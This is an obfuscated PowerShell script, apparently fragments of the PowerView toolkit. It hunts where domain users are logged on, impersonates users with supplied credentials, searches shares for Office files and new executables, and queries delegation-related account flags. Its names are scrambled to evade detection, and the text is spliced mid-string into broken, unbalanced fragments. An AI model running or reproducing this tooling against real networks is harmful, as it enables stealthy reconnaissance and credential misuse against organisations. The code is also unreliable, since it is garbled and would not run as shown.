        YoV{SEIJKRVERtIJKImIJKELiMiT},

        [Switch]
        YoV{tIJKOmIJKBstoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKEdeNTIIJKAl} =  YoV{JIJKFi}::Z3bEIJKMPtyZ3b
    )

    BEGIN {
        function sPLIJKiIJKT-pIJKAth {
            
            Param([String]YoV{pAIJKTH})

            if (YoV{pIJKATH} -and (YoV{PIJKAth}.(Z3b{0}{1}Z3b -fS5zsplS5z,S5zitS5z).Invoke(S5z5rj5rjS5z).Z3bcoIJKUNTZ3b -ge 3)) {
                YoV{tIJKeMp} = YoV{pIJKATh}.(Z3b{1}{0}Z3b-fS5zitS5z,S5zsplS5z).Invoke(S5z5rj5rjS5z)[2]
                if (YoV{TEIJKMP} -and (YoV{teIJKMP} -ne S5zS5z)) {
                    YoV{tEIJKmp}
                }
            }
        }

        YoV{SIJKEARIJKcHERargUIJKMIJKEIJKNTs} = @{
            (Z3b{2}{1}{0}Z3b -f S5zterS5z,S5zlS5z,S5zLDAPFiS5z) = (((Z3b{30}{16}{18}{9}{0}{7}{19}{6}{11}{25}{22}{29}{24}{27}{12}{26}{10}{31}{2}{13}{5}{23}{8}{21}{1}{3}{20}{15}{14}{17}{4}{28}Z3b-f S5ztTS5z,S5z*)(sS5z,S5z2))(S5z,S5zcriptpath=*S5z,S5z=*)S5z,S5zde(hS5z,S5z(S5z,S5zype=80S5z,S5zedirectS5z,S5zunS5z,S5z8S5z,S5zuserS5z,S5z1135S5z,S5zDS5z,S5zpS5z,S5zileS5z,S5zsamS5z,S5zathS5z,S5zAccoS5z,S5z5306368)(!S5z,S5z)(profS5z,S5zory=S5z,S5zntContS5z,S5zomS5z,S5z.S5z,S5zAccouS5z,S5z56.1.4.S5z,S5z2.840.S5z,S5z))S5z,S5zrol:1S5z,S5z(&(S5z,S5z03:=S5z)).(Z3b{1}{0}{2}Z3b-fS5zEplACS5z,S5zRS5z,S5zES5z).Invoke(S5zDdeS5z,S5zJGOS5z))
            (Z3b{2}{1}{0}Z3b -f S5zsS5z,S5zieS5z,S5zP','IJKenIJKTs}[S5zRawS5z] = YoV{tRIJKUe}
            YoV{searIJKcHeIJKRIJKArgUmENtS}[(Z3b{1}{0}{2}Z3b -f S5zdentS5z,S5zIS5z,S5zityS5z)] = YoV{IIJKdeNTIJKItY}

            
            YoV{raWOIJKBIJKJeIJKCT} = &(Z3b{2}{1}{3}{0}Z3b-f S5zectS5z,S5zDomainS5z,S5zGet-S5z,S5zObjS5z) @Sea','iS5z,S5zDoS5z,S5znS5z)]) { YoV{SEaRcIJKheIJKRaIJKRIJKGUmEIJKNts}[(Z3b{1}{0}Z3b -f S5zinS5z,S5zDomaS5z)] = YoV{dIJKOMaIJKin} }
        if (YoV{pSIJKBoUnDPAIJKRIJKAMIJKEtERS}[(Z3b{2}{0}{1}Z3b -f S5zFilS5z,S5zterS5z,S5zLDAPS5z)]) { YoV{SIJKearIJKCIJKHerIJKARGuMEnts}[(Z3b{1}{0}{2}Z3b -f S5zPFilS5z,S5zLDAS5z,S5zterS5z)] = YoV{ldIJKAIJKPFiltIJKER} }
        if (YoV{psboIJKUNdparIJKAmeTIJKeIJKRs}[(Z3b{1}{2}{0}Z3b -fS5zseS5z,S5zSearchBS5z,S5zaS5z)]) { YoV{SEarIJKcIJKhErARguIJKmeNts}[(Z3b{2}{0}{1}Z3b-fS5zrchBasS5z,S5zeS5z,S5zSeaS5z)] = YoV{SIJKEARCIJKhBAse} }
        if (YoV{pSIJKBIJKOUNdParAIJKmIJKeTerS}[(Z3b{1}{0}Z3b -fS5zverS5z,S5zSerS5z)]) { YoV{seIJKAIJKRChIJKEraRgUMeIJKNtS}[(Z3b{0}{1}Z3b -f S5zServS5z,S5zerS5z)] = YoV{SEIJKRIJKVeR} }
        if (YoV{PSIJKBOUIJKNIJKDPArAIJKmETIJKerS}[(Z3b{1}{0}{2}{3}Z3b-fS5zrchS5z,S5zSeaS5z,S5zScopS5z,S5zeS5z)]) { YoV{sIJKEARcIJKHEraRGUMenIJKTS}[(Z3b{1}{0}{2}Z3b-f S5zScopS5z,S5zSearchS5z,S5zeS5z)] = YoV{SeArcIJKhIJKscIJKoPe} }
        if (YoV{psIJKBouNdPIJKAIJKRaMEIJKTERS}[(Z3b{2}{1}{3}{0}Z3b -fS5zzeS5z,S5zageSS5z,S5zResultPS5z,S5ziS5z)]) { YoV{sEIJKArChIJKeRaRgIJKUmIJKeIJKNts}[(Z3b{1}{3}{2}{0}Z3b -f S5zeSizeS5z,S5zRS5z,S5zagS5z,S5zesultPS5z)] = YoV{reIJKSUlIJKTpAGIJKeSize} }
        if (YoV{psBOUIJKNIJKDpAIJKRAmetERS}[(Z3b{1}{0}{2}Z3b -fS5zrveS5z,S5zSeS5z,S5zrTimeLimitS5z)]) { YoV{SIJKEIJKARcHErARgIJKUIJKmEnIJKTS}[(Z3b{3}{0}{4}{1}{2}Z3b -f S5zerTS5z,S5zeLS5z,S5zimitS5z,S5zServS5z,S5zimS5z)] = YoV{SeRVeRIJKTIJKiMElIIJKmIT} }
        if (YoV{PIJKsboUNdPAIJKRameTEIJKRS}[(Z3b{2}{1}{0}Z3b-f S5zmbstoneS5z,S5zoS5z,S5zTS5z)]) { YoV{seAIJKRcIJKherIJKArgUMIJKENTS}[(Z3b{0}{2}{1}Z3b-f S5zTomS5z,S5zoneS5z,S5zbstS5z)] = YoV{tIJKombstoIJKNE} }
        if (YoV{PSBOunIJKDIJKPARAmEtIJKeIJKRS}[(Z3b{1}{2}{0}Z3b -f S5ztialS5z,S5zCredS5z,S5zenS5z)]) { YoV{sEIJKARCHErARIJKgUMIJKENTs}[(Z3b{1}{2}{0}Z3b-f S5zntialS5z,S5zCreS5z,S5zdeS5z)] = YoV{CreDeIJKNtIJKiIJKAL} }

        
',' YoV{vALIJKUE}).Z3bSvIJKAlIJKUEZ3b

                YoV{lAsIJKTIJKLogGIJKeIJKDOn} = &(Z3b{1}{0}{2}Z3b -fS5zw-ObjeS5z,S5zNeS5z,S5zctS5z) (Z3b{0}{1}Z3b -f S5zPSObjeS5z,S5zctS5z)
                YoV{lIJKAIJKSTlOGGEDON} JGO &(Z3b{1}{2}{3}{0}Z3b -f S5zmberS5z,S5zAS5z,S5zdd-MS5z,S5zeS5z) (Z3b{2}{3}{0}{1}Z3b -fS5zteproS5z,S5zpertyS5z,S5zNS5z,S5zoS5z) (Z3b{1}{2}{0}Z3b -f S5zmeS5z,S5zCoS5z,S5zmputerNaS5z) YoV{COIJKmpIJKUTeR}
                YoV{LAStLOIJKGGeIJKdIJKon} JGO &(Z3b{0}{2}{1}Z3b-fS5zAS5z,S5zMemberS5z,S5zdd-S5z) (Z3b{2}{0}{3}{1}Z3b -f S5zoperS5z,S5zyS5z','nvoke(),   YoV{r2IJK69F}.(Z3b{2}{1}{4}{0}{3}Z3b -f S5zefTypS5z,S5zeByS5z,S5zMakS5z,S5zeS5z,S5zRS5z).Invoke(),   YoV{RIJK269f}.(Z3b{2}{1}{0}','       }
                                    else {
                                        YoV{uSerLoIJKCIJKAtioN} JGO &(Z3b{0}{1}{2}Z3b-f S5zAddS5z,S5z-S5z,S5zMemberS5z) (Z3b{1}{2}{0}{3}Z3b -fS5zertS5z,S5zNoteS5z,S5zpropS5z,S5zyS5z) (Z3b{0}{2}{1}Z3b-fS5zLS5z,S5zinS5z,S5zocalAdmS5z) YoV{NIJKUlL}
                                    }
                                    YoV{USIJKErIJKLoIJKCIJKATiOn}.Z3bPSoBjEIJKcTZ3b.Z3bTypenIJKAMIJKeSZ3b.(Z3b{1}{0}Z3b-f S5znsertS5z,S5zIS5z).Invoke(0, (Z3b{2}{3}{4}{1}{0}Z3b -f S5znS5z,S5ztioS5z,S5zPoS5z,S5zwerView.UserLS5z,S5zocaS5z))
                                    YoV{uSIJKERIJKLoIJKcATIJKION}
                                }
                            }
                        }
                    }
                }
            }

            if (YoV{tOKIJKeIJKNhIJKAndLe}) {
                &(Z3b{1}{2}{0}{3}Z3b -f S5zvertS5z,S5zInvoke-S5z,S5zReS5z,S5zToSelfS5z)
            }
        }

        YoV{LIJKOGontOkIJKEn} = YoV{NIJKULl}
        if (YoV{pIJKSIJKBIJKoIJKUndpARaMETERs}[(Z3b{2}{1}{0}Z3b-fS5zalS5z,S5ztiS5z,S5zCredenS5z)]) {
            if (YoV{PsbOIJKUNdpIJKAraIJKmIJKeIJKTeRS}[(Z3b{1}{0}Z3b -f S5zelayS5z,S5zDS5z)] -or YoV{pSIJKBoIJKUIJKNdpIJKArAMEIJKTers}[(Z3b{0}{4}{2}{1}{3}Z3b-fS5zSS5z,S5zucS5z,S5zSS5z,S5zcessS5z,S5ztopOnS5z)]) {
                YoV{LIJKOIJKGoNTOKen} = &(Z3b{7}{0}{4}{3}{2}{1}{6}{5}Z3b-f S5zoS5z,S5zersonS5z,S5zImpS5z,S5z-UserS5z,S5zkeS5z,S5zonS5z,S5zatiS5z,S5zInvS5z) -Credential YoV{cIJKREIJKDenTIIJKAl}
            }
            else {
                YoV{LoIJKgonIJKToIJKken} = &(Z3b{6}{1}{4}{2}{5}{3}{0}Z3b -f S5zationS5z,S5zkS5z,S5z-US5z,S5zsonS5z,S5zeS5z,S5zserImperS5z,S5zInvoS5z) -Credential YoV{cReIJKDEIJKNTIal} -Quiet
            }
        }
    }

    PROCESS {
        
        if (YoV{PsBIJKOUndPArAMEIJKTIJKErs}[(Z3b{0}{1}Z3b -f S5zDelS5z,S5zayS5z)] -or YoV{PIJKSBoUNDPAIJKRamETEIJKRs}[(Z3b{3}{1}{0}{2}Z3b -f S5zopS5z,S5ztS5z,S5zOnSuccessS5z,S5zSS5z)]) {

            &(Z3b{0}{1}{2}Z3b-f S5zWrite-VerboS5z,S5zsS5z,S5zeS5z) Z3b[Find-DomainUserLocation] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{0}{4}{2}{1}{3}Z3b-f S5zWriS5z,S5z-VeS5z,S5zeS5z,S5zrboseS5z,S5ztS5z) (S5z[S5z+S5zFS5z+S5zind-DomainUS5z+S5zseS5z+S5zrS5z+S5zLocS5z+S5zatioS5z+S5zn] S5z+S5zDelay:S5z+S5z S5z+Z3bYoVDelay, Z3b+S5zJittS5z+S5zeS5z+S5zr: S5z+Z3bYoVJitterZ3b)
            YoV{CIJKoIJKUntER} = 0
            YoV{RAnIJKDnO} = &(Z3b{0}{2}{1}Z3b -f S5zNeS5z,S5zbjectS5z,S5zw-OS5z) (Z3b{1}{3}{0}{2}Z3b-fS5zm.RaS5z,S5zSysS5z,S5zndomS5z,S5zteS5z)

            ForEach (YoV{taRGIJKETIJKCOmPUIJKTeR} in YoV{TaRGETIJKCOMIJKPutErS}) {
                YoV{cIJKOUIJKNTer} = YoV{coUNIJKTER} + 1

                
                &(Z3b{0}{1}{2}{3}Z3b -fS5zStart-S5z,S5zSS5z,S5zleS5z,S5zepS5z) -Seconds YoV{rIJKAnIJKdNo}.(Z3b{0}{1}Z3b -f S5zNeS5z,S5zxtS5z).Invoke((1-YoV{jitIJKTIJKER})*YoV{deLIJKAy}, (1+YoV{jiIJKTTEr})*YoV{DIJKeIJKLAY})

                &(Z3b{4}{2}{1}{0}{3}Z3b -f S5zrS5z,S5zeS5z,S5zrite-VS5z,S5zboseS5z,S5zWS5z) Z3b[Find-DomainUserLocation] Enumerating server YoVComputer (YoVCounter of YoV(YoVTargetComputers.Count)) Z3b
                &(Z3b{3}{2}{4}{0}{1}Z3b-f S5zCoS5z,S5zmmandS5z,S5znS5z,S5zIS5z,S5zvoke-S5z) -ScriptBlock YoV{HIJKosteNIJKUmIJKBlIJKOcK} -ArgumentList YoV{TIJKArgEtCOIJKmpUIJKTeR}, YoV{TIJKArgEtuSeIJKRs}, YoV{cIJKUIJKRRIJKentusEr}, YoV{StEAIJKLIJKTH}, YoV{LogIJKONTOIJKken}

                if (YoV{REsIJKUlt} -and YoV{stOPIJKoNIJKsUcIJKceIJKsS}) {
                    &(Z3b{3}{1}{2}{0}Z3b-fS5zVerboseS5z,S5zritS5z,S5ze-S5z,S5zWS5z) (Z3b{2}{11}{7}{3}{0}{8}{1}{5}{12}{9}{6}{4}{10}Z3b-fS5zinUseS5z,S5zrS5z,S5z[S5z,S5zd-DomaS5z,S5zturnS5z,S5zget userS5z,S5zreS5z,S5zinS5z,S5zrLocation] TaS5z,S5zfound, S5z,S5zing earlyS5z,S5zFS5z,S5z S5z)
                    return
                }
            }
        }
        else {
            &(Z3b{0}{4}{1}{2}{3}Z3b-f S5zWritS5z,S5z-VS5z,S5zerbosS5z,S5zeS5z,S5zeS5z) (S5z[Find-S5z+S5zDS5z+S5zomaS5z+S5zinUserLS5z+S5zocationS5z+S5z] S5z+S5zUsS5z+S5zing S5z+S5ztS5z+S5zhS5z+S5zreS5z+S5zading S5z+S5zwitS5z+S5zh S5z+S5zthS5z+S5zreaS5z+S5zds: S5z+Z3bYoVThreadsZ3b)
            &(Z3b{0}{2}{1}Z3b-fS5zWS5z,S5z-VerboseS5z,S5zriteS5z) Z3b[Find-DomainUserLocation] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b

            
            YoV{sIJKCRIJKIpIJKTIJKpARams} = @{
                (Z3b{2}{0}{1}{3}Z3b-f S5zetS5z,S5zUS5z,S5zTargS5z,S5zsersS5z) = YoV{tARIJKgeIJKTUSeRS}
                (Z3b{1}{0}{3}{2}Z3b -fS5zenS5z,S5zCurrS5z,S5zrS5z,S5ztUseS5z) = YoV{CURIJKReIJKNTUser}
                (Z3b{1}{2}{0}Z3b -fS5zhS5z,S5zStS5z,S5zealtS5z) = YoV{sIJKTealTh}
                (Z3b{0}{1}{2}Z3b-f S5zTS5z,S5zokenHanS5z,S5zdleS5z) = YoV{loGONtIJKoIJKKEN}
            }

            
            &(Z3b{0}{1}{2}{3}Z3b-f S5zNeS5z,S5zw-ThrS5z,S5zeadedFuS5z,S5znctionS5z) -ComputerName YoV{tIJKArGetCOIJKMPutIJKeRs} -ScriptBlock YoV{hOstIJKeI','btS5z,S5zSS5z,S5zreeS5z})]
        [String]
        YoV{SeIJKArcHsIJKCOIJKpe} = (Z3b{2}{1}{0}Z3b-fS5ztreeS5z,S5zbS5z,S5zSuS5z','&(Z3b{0}{2}{1}Z3b-f S5zAdd-MembS5z,S5zrS5z,S5zeS5z) (Z3b{1}{2}{0}{3}Z3b -f S5zepropS5z,S5zNoS5z,S5ztS5z,S5zertyS5z) (Z3b{1}{0}{5}{4}{2}{3}{6}Z3b -fS5zgerDiS5z,S5zManaS5z,S5zgS5z,S5zuishedNS5z,S5zinS5z,S5zstS5z,S5zameS5z) YoV{gRIJKoIJKUpIJKMIJKANageR}.','ty()]
        [DateTime]
        YoV{laSIJKTIJKWritEtIJKIIJKME},

        [Parameter(paRaMeteRSETNAMe = Z3bFIIJKlIJKEIJKSpeCIJKiFiCaTiONZ3b)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{crIJKEaIJKTIontIME},

        [Parameter(PArAMEteRsetNAme = Z3bOIJKFFiCIJKeIJKdoCSZ3b)]
        [Switch]
        YoV{offICEIJKdIJKoIJKCs},

        [Parameter(parAMETeRseTNAMe = Z3bfRIJKESHIJKExESZ3b)]
        [Switch]
        YoV{FRIJKEsHIJKeXeS},

        [Parameter(PARaMetErsetNAmE = Z3bFIJKiIJKLIJKEIJKSPecIFiIJKCatIonZ3b)]
        [Switch]
        YoV{eIJKxcIJKlUdeIJKFoldErS},

        [Parameter(parametERSEtnAME = Z3bFIJKIlIJKesPEcificIJKAIJKTIONZ3b)]
        [Switch]
        YoV{EXIJKClUdEIJKhiddIJKEN},

        [Switch]
        YoV{cHIJKecKwIJKRITeAIJKCceIJKSS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{creIJKdIJKenIJKTiAL} =  (&(Z3b{1}{0}Z3b -f S5zMS5z,S5ziTES5z)  vaRiable:JFI ).Z3bvAlIJKUeZ3b::Z3beIJKMPtyZ3b
    )

    BEGIN {
        YoV{SeaIJKRcHerargIJKUIJKmentS} =  @{
            (Z3b{0}{1}Z3b -f S5zRecursS5z,S5zeS5z) = YoV{tRIJKUE}
            (Z3b{1}{2}{0}Z3b-fS5zionS5z,S5zErrorS5z,S5zActS5z) = (Z3b{0}{1}{2}{3}Z3b -f S5zSiS5z,S5zlS5z,S5zentS5z,S5zlyContinueS5z)
            (Z3b{0}{2}{1}Z3b -fS5zIncS5z,S5zdeS5z,S5zluS5z) = YoV{IIJKNIJKclUdE}
        }
        if (YoV{pSbounDPARIJKAIJKmeTIJKeRS}[(Z3b{0}{3}{1}{2}Z3b -f S5zOfficS5z,S5zocS5z,S5zsS5z,S5zeDS5z)]) {
            YoV{SeArCIJKhIJKeIJKRARgUIJKments}[(Z3b{0}{2}{1}Z3b-f S5zIS5z,S5zeS5z,S5zncludS5z)] = @((Z3b{1}{0}Z3b-f S5zcS5z,S5z*.doS5z), (Z3b{0}{1}Z3b -f S5z*.doS5z,S5zcxS5z), (Z3b{0}{1}Z3b -fS5z*S5z,S5z.xlsS5z), (Z3b{0}{1}Z3b-f S5z*.S5z,S5zxlsxS5z), (Z3b{0}{1}Z3b -fS5z*.ppS5z,S5ztS5z), (Z3b{2}{1}{0}Z3b -f S5zptxS5z,S5zpS5z,S5z*.S5z))
        }
        elseif (YoV{PsIJKBIJKOUIJKNDParAMEtIJKerS}[(Z3b{1}{2}{0}Z3b-fS5zsS5z,S5zFS5z,S5zreshEXES5z)]) {
            
            YoV{LaIJKsTIJKAcCESsTime} = (&(Z3b{0}{1}{2}','z,S5zCredS5z,S5zentS5z)] = YoV{CIJKREIJKDEIJKNtiaL} }
    }

    PROCESS {
        if (YoV{pScMIJKDlIJKET}.ParAmETersEtName -ne S5zAPIS5z) {
            YoV{nIJKetIJKSeARIJKcHERarIJKGuIJKMentS} = @{}
            if (YoV{DoIJKMAIn} -and YoV{DIJKoIJKMAiN}.(Z3b{1}{0}Z3b-f S5zimS5z,S5zTrS5z).Invoke() -ne S5zS5z) {
                YoV{soIJKURCEdoIJKMAIn} = YoV{doIJKmAIJKIn}
            }
            else {
                if (YoV{pSBIJKounDPIJKARIJKAMIJKeTeIJKRs}[(Z3b{1}{0}{2}Z3b -fS5zedentS5z,S5zCrS5z,S5zialS5z)]) {
                    YoV{sOUIJKRcedIJKoMaIn} = (&(Z3b{2}{1}{0}Z3b -f S5zinS5z,S5zDomaS5z,S5zGet-S5z) -Credential YoV{CreIJKdeNtIJKiaL}).Z3bnAIJKMeZ3b
                }
                else {
                    YoV{sOIJKURcIJKEdoIJKmAIN} = (&(Z3b{0}{3}{2}{1}Z3b-fS5zGS5z,S5zomainS5z,S5z-DS5z,S5zetS5z)).Z3bNIJKAMeZ3b
                }
            }
        }
        elseif (YoV{psCMIJKdIJKlIJKet}.paRAmEterSeTNAMe -ne S5zNETS5z) {
            if (YoV{dOIJKMAIJKin} -and YoV{DOmaIJKIN}.(Z3b{0}{1}Z3b -fS5zTS5z,S5zrimS5z).Invoke() -ne S5zS5z) {
                YoV{sOUIJKRcIJKeDomAIN} = YoV{DomAIJKiN}
            }
            else {
                YoV{sOUIJKRcIJKeIJKdomaIJKIN} = YoV{ENIJKV:USEIJKRDnsIJKDomaIJKiN}
            }
        }

        if (YoV{PscIJKmIJKDlet}.paRamEterSeTnAME -eq (Z3b{0}{1}Z3b-f S5zLDS5z,S5zAPS5z)) {
            
            YoV{TIJKRIJKUsTSEaIJKRChEr','5zrofS5z),(Z3b{0}{1}Z3b -f S5znamS5z,S5zeS5z),(Z3b{2}{1}{0}Z3b -f S5zyS5z,S5zctcategorS5z,S5zobjeS5z),(Z3b{1}{0}{2}Z3b-f S5zctS5z,S5zobjeS5z,S5zclassS5z),(Z3b{3}{0}{1}{2}Z3b-f S5zbjS5z,S5zectS5z,S5z','}{4}{7}{3}{2}{6}{8}{1}Z3b -fS5zUSS5z,S5zNS5z,S5zES5z,S5zDS5z,S5zTED_TO_AUTH_S5z,S5zTRS5z,S5zLES5z,S5zFOR_S5z,S5zGATIOS5z), 16777216)
        YoV{UAIJKcVIJKALuEs}.(Z3b{1}{0}Z3b-fS5zdS5z,S5zAdS5z).Invoke((Z3b{4}{7}{3}{1}{0}{6}{5}{2}Z3b -fS5zSES5z,S5zL_S5z,S5zUNTS5z,S5zAS5z,S5zPAS5z,S5zRETS_ACCOS5z,S5zCS5z,S5zRTIS5z), 67108864)
    }

    PROCESS {
        YoV{rESulIJKTUaIJKcVaLuIJKeS} = &(Z3b{2}{0}{1}Z3b-fS5zObjeS5z,S5zctS5z,S5zNew-S5z) (Z3b{6}{2}{0}{7}{5}{10}{8}{9}{4}{1}{3}Z3b-f S5zem.S5z,S5ztS5z,S5ztS5z,S5zionaryS5z,S5zicS5z,S5zs.SpecialiS5z,S5zSysS5z,S5zCollectionS5z,S5zrderS5z,S5zedDS5z,S5zzed.OS5z)

        if (YoV{sIJKHOwIJKAll}) {
            ForEach (YoV{uaIJKCVAlUe} in YoV{UIJKAIJKCvAlUeS}.(Z3b{1}{0}{2}Z3b -fS5ztEnumeS5z,S5zGeS5z,S5zratorS5z).Invoke()) {
                if ( (YoV{ValIJKUe} -band YoV{uaIJKcVAlIJKUE}.Z3bVIJKAluEZ3b) -eq YoV{UIJKAcVIJKAIJKLuE}.Z3bvAIJKLUeZ3b) {
                    YoV{RIJKEsUIJKLt','                (Z3b{2}{1}{0}Z3b -fS5zyS5z,S5zntitS5z,S5zIdeS5z) = YoV{userIJKgIJKRoUIJKPIJKIDEntiIJKTy}
                (Z3b{1}{0}Z3b-fS5zecurseS5z,S5zRS5z) = YoV{tIJKRUE}
            }
            if (YoV{PsIJKBoIJKUnIJKdPArAIJKmEteIJKRS}[(Z3b{1}{2}{0}Z3b -fS5zomainS5z,S5zUS5z,S5zserDS5z)]) { YoV{groUIJKpsIJKeaIJKRIJKcIJKHeRARgUmEnIJKTS}[(Z3b{0}{1}{2}Z3b-fS5zDS5z,S5zomS5z,S5zainS5z)] = YoV{USerDoIJKmIJKAIJKiN} }
            if (YoV{PIJKsIJKBOIJKUnDPAraMETIJKers}[(Z3b{1}{3}{4}{0}{2}Z3b-f S5zsS5z,S5zUserSeS5z,S5zeS5z,S5zarS5z,S5zchBaS5z)]) { YoV{GROuPsEIJKArIJKCIJKHeRaIJKRGuMenTS}[(Z3b{1}{0}{3}{2}Z3b -f S5zarchBaS5z,S5zSeS5z,S5zeS5z,S5zsS5z)] = YoV{uSEIJKRsEaRcHIJKBase} }
            if (YoV{PsbIJKoUndpIJKARaIJKmEtIJKERs}[(Z3b{1}{0}Z3b-fS5zer',',S5zmainS5z)]) { YoV{dIJKOmaIJKINsEaRCIJKhIJKeIJKRargUMIJKENIJKTS}[(Z3b{1}{0}Z3b -fS5zainS5z,S5zDomS5z)] = YoV{dIJKoMAiN} }
        if (YoV{PSbIJKOUndIJKpIJKARamIJKETIJKErS}[(Z3b{1}{0}{2}Z3b-fS5zervS5z,S5zSS5z,S5zerS5z)]) { YoV{domaiIJKNsEIJKAIJKRCIJKHERIJKArgUmIJKEnTs}[(Z3b{0}{1}Z3b-fS5zServeS5z,S5zrS5z)] = YoV{sErIJKVer} }
        if (YoV{PsBoUNIJKDIJKPARaMEtIJKErs}[(Z3b{0}{2}{3}{1}Z3b-fS5zCreS5z,S5zlS5z,S5zdentiS5z,S5zaS5z)]) { YoV{DOMIJKAIJKinsEIJKARcHeraIJKRgumENTS}[(Z3b{0}{2}{1}Z3b-f S5zCreS5z,S5ztialS5z,S5zdenS5z)] = YoV{CREdeIJKNtIJKIIJKAL} }
    }

    PROCESS {
        ForEach (YoV{OBjeIJKct} in YoV{oIJKBjECtnIJKAIJKMe}) {
            YoV{OIJKBIJKJect} = YoV{OIJKBjECt} -Replace S5z/S5z,S5z5rjS5z

            if (YoV{PSbOuIJKNdpIJKAraIJKMeTErs}[(Z3b{1}{2}{0}Z3b -f S5zialS5z,S5zCS5z,S5zredentS5z)]) {
                YoV{dn} = &(Z3b{0}{2}{1}Z3b-f S5zConverS5z,S5zeS5z,S5zt-ADNamS5z) -Identity YoV{objIJKeIJKCT} -OutputType S5zDNS5z @DomainSearcherArguments
                if (YoV{DIJKN}) {
                    YoV{UIJKsIJKeRDomAIn} = YoV{DIJKN}.(Z3b{3}{2}{1}{0}Z3b-f S5zngS5z,S5zriS5z,S5zbStS5z,S5zSuS5z).Invoke(YoV{dn}.(Z3b{2}{1}{0}Z3b-fS5zOfS5z,S5zndexS5z,S5zIS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                    YoV{usIJKErIJKNAmE} = YoV{dIJKN}.(Z3b{0}{1}Z3b-fS5zSS5z,S5zplitS5z).Invoke(S5z,S5z)[0].(Z3b{1}{0}Z3b -f S5zplitS5z,S5zsS5z).Invoke(S5z=S5z)[1]

                    YoV{doMIJKAinSearCIJKHERaRIJKgIJKUmeNts}[(Z3b{1}{2}{0}Z3b-f S5ztyS5z,S5zIdenS5z,S5ztiS5z)] = YoV{UsErnAIJKME}
                    YoV{dOmAIJKInIJKSIJKeaIJKRIJKcHeRarguIJKMENts}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)] = YoV{uSEIJKRDomIJKAIJKiN}
                    YoV{DomAIJKinSeIJKArIJKcIJKHeRargUMeIJKNIJKTs}[(Z3b{0}{2}{1}Z3b-f S5zProperS5z,S5ziesS5z,S5ztS5z)] = (Z3b{2}{1}{0}Z3b -f S5zidS5z,S5ztsS5z,S5zobjecS5z)
                    &(Z3b{3}{0}{5}{2}{4}{1}Z3b -f S5zt-S5z,S5zctS5z,S5zOS5z,S5zGeS5z,S5zbjeS5z,S5zDomainS5z) @DomainSearcherArguments JGO &(Z3b{1}{0}{2}Z3b -f S5zt-OS5z,S5zSelecS5z,S5zbjectS5z) -Expand (Z3b{2}{1}{0}Z3b -fS5zdS5z,S5zctsiS5z,S5zobjeS5z)
                }
            }
            else {
                try {
                    if (YoV{OBjeIJKCT}.(Z3b{1}{0}{2}Z3b -f S5zaS5z,S5zContS5z,S5zinsS5z).Invoke(S5z5rjS5z)) {
                        YoV{DoMIJKAIn} = YoV{oIJKBject}.(Z3b{0}{1}Z3b-fS5zSpS5z,S5zlitS5z).Invoke(S5z5rjS5z)[0]
                        YoV{oBJeIJKcT} = YoV{oBIJKjeCT}.(Z3b{1}{0}Z3b -fS5zlitS5z,S5zSpS5z).Invoke(S5z5rjS5z)[1]
                    }
                    elseif (-not YoV{PSbOuNDIJKPaRaMIJKetIJKEIJKRs}[(Z3b{1}{0}{2}Z3b-f S5zaiS5z,S5zDomS5z,S5znS5z)]) {
                        YoV{DOIJKMAiNsIJKEarIJKCHIJKeraIJKRGUmIJKEntS} = @{}
                        YoV{dOmIJKAIJKIN} = (&(Z3b{1}{0}{3}{2}Z3b-f S5zeS5z,S5zGS5z,S5zinS5z,S5zt-DomaS5z) @DomainSearcherArguments).Z3bnIJKAmeZ3b
                    }

                    YoV{oIJKBj} = (&(Z3b{1}{2}{0}Z3b-f S5zjectS5z,S5zNS5z,S5zew-ObS5z) (Z3b{0}{9}{8}{7}{3}{6}{5}{10}{1}{2}{4}Z3b-fS5zSysS5z,S5zAS5z,S5zccouS5z,S5zinS5z,S5zntS5z,S5zpalS5z,S5zciS5z,S5zrS5z,S5zrity.PS5z,S5ztem.SecuS5z,S5z.NTS5z)(YoV{DOmIJKAin}, YoV{obIJKjIJKeCt}))
                    YoV{oIJKBJ}.Z3btRIJKANIJKSlaTEZ3b([System.Security.Principal.SecurityIdentifier]).Z3bvIJKAlUEZ3b
                }
                catch {
                    &(Z3b{0}{2}{1}Z3b-f S5zWrite-VS5z,S5zseS5z,S5zerboS5z) (S5z[ConvertTo-SS5z+S5zIDS5z+S5z] S5z+S5zES5z+S5zrroS5z+S5zr S5z+S5zcS5z+S5zonverS5z+S5ztS5z+S5zing S5z+Z3bYoVDomain5rjYoVObject Z3b+S5z: S5z+Z3bYoV_Z3b)
                }
            }
        }
    }
}


function CIJKOnVerTIJKFROMIJK-siD {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANDatOrY = YoV{tRIJKUE}, valUEfromPipeLine = YoV{TIJKRue}, VALuEfROMPipeLInEbYPROPeRtyNaMe = YoV{TRIJKUE})]
        [Alias(S5zSIDS5z)]
        [ValidatePattern({Z3b{0}{1}Z3b -fS5z^SS5z,S5z-1-.*S5z})]
        [String[]]
        YoV{oBjIJKecTSIJKID},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DIJKOmAIJKiN},

        [ValidateNotNullOrEmpty()','{taRIJKgIJKeTsIJKEarIJKchERIJKAIJKRgUmeNtS}[(Z3b{1}{0}Z3b-fS5zerS5z,S5zServS5z)] = YoV{SErVIJKEr} }
        if (YoV{PsIJKBOIJKUIJKNIJKDIJKpARameTeRs}[(Z3b{0}{2}{1}Z3b-fS5zSearchSS5z,S5zopeS5z,S5zcS5z)]) { YoV{taRIJKgEtSIJKEIJKAIJKRchERArGUIJKmenTs}[(Z3b{0}{1}{2}Z3b-f S5zSearcS5z,S5zhScoS5z,S5zpeS5z)] = YoV{sEaIJKRcIJKHSIJKCOpE} }
